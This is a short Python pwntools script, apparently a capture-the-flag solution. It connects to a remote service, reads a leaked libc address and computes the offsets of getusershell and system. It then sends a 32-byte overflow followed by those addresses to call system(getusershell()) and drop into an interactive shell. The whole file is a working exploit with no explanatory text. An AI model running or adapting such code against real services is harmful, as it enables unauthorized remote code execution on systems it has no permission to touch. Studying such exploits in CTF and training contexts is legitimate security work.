#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.88.15.183"
host = "10.211.55.19"
host = "13.230.48.252"
port = 4869

r = remote(host,port)


# system(getusershell())
libc = int(r.recvuntil("\n").strip(),16) - 0x154560
print hex(libc)
getuser = libc + 0x00000000000cbb98
system = libc + 0x3f2d8
payload = "a"*0x20 + p64(getuser) + p64(system)
r.sendline(payload)
r.interactive()
